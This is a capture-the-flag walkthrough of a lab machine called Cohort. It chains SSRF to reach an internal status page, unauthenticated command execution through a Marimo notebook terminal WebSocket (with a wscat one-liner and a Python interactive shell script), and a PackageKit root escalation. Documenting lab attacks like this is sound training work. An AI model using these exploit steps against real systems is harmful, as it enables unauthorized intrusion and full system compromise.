# Cohort

## Reconnaissance

Command:

```bash
nmap -sV -sC -T5 <target_ip>
```

The scan reveals three open ports: SSH (22), and an HTTP/HTTPS web server on 80/443.

Add `cohort.htb` to `/etc/hosts`.

---

## Discover an SSRF-Capable URL Fetch Feature

Browsing the website reveals a feature that lets a user submit a public URL, after which the application fetches and displays the data from the file referenced by that URL. Server-side URL fetching driven by user input is a classic indicator of a potential Server-Side Request Forgery (SSRF) vulnerability, so this became the primary avenue to investigate.

Inspecting the site's traffic shows the feature is backed by an API endpoint, `/api/validate/`, which performs the actual validation and fetch of the submitted URL — confirming SSRF as a viable exploitation path.

---

## Enumerate API Endpoints

Fuzz the `/api` path for further endpoints:

```bash
ffuf -k -u https://cohort.htb/api/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -mc all -fc 404 -ac
```

This turns up `/api/health`, which returns:

```json
{"ok": true, "service": "cohort-insights"}
```

---

## Enumerate Website Directories

Fuzz the web root more broadly:

```bash
ffuf -k -u https://cohort.htb/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -mc all -fc 404 -ac
```

Results include several notable paths:

```text
api/experiments                 [Status: 405]
api                              [Status: 301]
api/experiments/configurations  [Status: 405]
assets                           [Status: 301]
status                           [Status: 403]
```

`/status` returns a 403 when browsed directly, but its presence alongside the SSRF-capable fetch feature suggested it was worth feeding through that feature instead of requesting it directly.

---

## Exploit the SSRF to Reach `/status`

Supplying `https://cohort.htb/status` as the target URL to the vulnerable fetch feature bypasses the direct-access restriction and returns the endpoint's contents:

```json
{"service":"cohort-edge","status":"ok","generated_by":"nginx","upstreams":[{"name":"marketing","host":"cohort.htb","root":"/var/www/cohort"},{"name":"insights-api","host":"cohort.htb","path":"/api/","target":"127.0.0.1:5000"},{"name":"notebooks","host":"nb-1be3782a8afd3ad5.cohort.htb","target":"127.0.0.1:8888","note":"internal analyst workspace, not for external use"}]}
```

This leaks internal nginx upstream configuration, most importantly a third virtual host — `nb-1be3782a8afd3ad5.cohort.htb` — described as an "internal analyst workspace, not for external use," running on port 8888.

---

## Discover the Internal Marimo Notebook Host

Add `nb-1be3782a8afd3ad5.cohort.htb` to `/etc/hosts` and browse to it. The host presents a Marimo notebook authentication page. No version banner is exposed on the page itself, so the exact Marimo version couldn't be confirmed by inspection alone.

---

## Exploit Marimo Pre-Auth RCE (CVE-2026-39987)

The Marimo instance is targeted with **CVE-2026-39987**, a pre-authentication remote code execution vulnerability. The vulnerable endpoint is the notebook's terminal WebSocket:

```text
wss://nb-1be3782a8afd3ad5.cohort.htb/terminal/ws
```

The WebSocket accepts unauthenticated connections and executes any plain-text command sent to it, terminated by a newline. A one-shot proof of concept with `wscat`:

```bash
wscat -n -c \
  wss://nb-1be3782a8afd3ad5.cohort.htb/terminal/ws \
  -x $'id\n'
```

The command executes as:

```text
uid=1000(marimo) gid=1000(marimo) groups=1000(marimo)
```

---

## Obtain a Persistent Shell

A one-shot connection is enough to confirm RCE, but a persistent interactive session is more practical for follow-up enumeration. The following Python script wraps the same WebSocket in a two-way terminal: a background thread streams output from the socket while the main thread forwards each line of local stdin as a command.

```python
import ssl
import sys
import threading
import websocket

url = "wss://nb-1be3782a8afd3ad5.cohort.htb/terminal/ws"

print("[*] Connecting...", flush=True)
try:
    ws = websocket.create_connection(
        url,
        sslopt={"cert_reqs": ssl.CERT_NONE},
        timeout=10
    )
    print("[+] Connected!", flush=True)
except Exception as e:
    print(f"[!] Connection failed: {e}", flush=True)
    sys.exit(1)

def receive():
    while True:
        try:
            data = ws.recv()
            if isinstance(data, bytes):
                data = data.decode(errors="replace")
            print(data, end="", flush=True)
        except Exception as e:
            print(f"\n[!] Receive thread died: {e}", flush=True)
            break

threading.Thread(target=receive, daemon=True).start()

print("[*] Type commands below:", flush=True)
for line in sys.stdin:
    ws.send(line.rstrip("\n") + "\n")
```

Running this script yields an interactive shell as `marimo`.

---

## Retrieve User Flag

```bash
cat /home/marimo/user.txt
```

The user flag is obtained.

---

# Privilege Escalation

## Enumerate Installed Packages

```bash
dpkg -l
```

Among the installed packages, `packagekit` is present at version `1.2.8-2ubuntu1.2` — a version vulnerable to **CVE-2026-41651**, a local privilege escalation vulnerability in PackageKit.

---

## Exploit PackageKit Privilege Escalation (CVE-2026-41651)

Exploit used:

https://github.com/0xBlackash/CVE-2026-41651/blob/main/CVE-2026-41651.py

The exploit script is transferred from the local attacking machine to the target, then executed directly on the `marimo` shell. Running it escalates privileges to root.

---

## Retrieve Root Flag

```bash
cat /root/root.txt
```

The root flag is successfully obtained.

---

# Attack Chain

```text
SSRF-capable URL fetch feature (/api/validate/) →
API/directory enumeration reveals /status (403 direct, reachable via SSRF) →
SSRF to /status leaks internal nginx upstream config →
Internal host discovered: nb-*.cohort.htb (Marimo notebook, port 8888) →
CVE-2026-39987 pre-auth RCE via unauthenticated /terminal/ws →
Shell as marimo (user flag) →
Vulnerable PackageKit 1.2.8-2ubuntu1.2 identified via dpkg -l →
CVE-2026-41651 local privilege escalation → Root Access (root flag)
```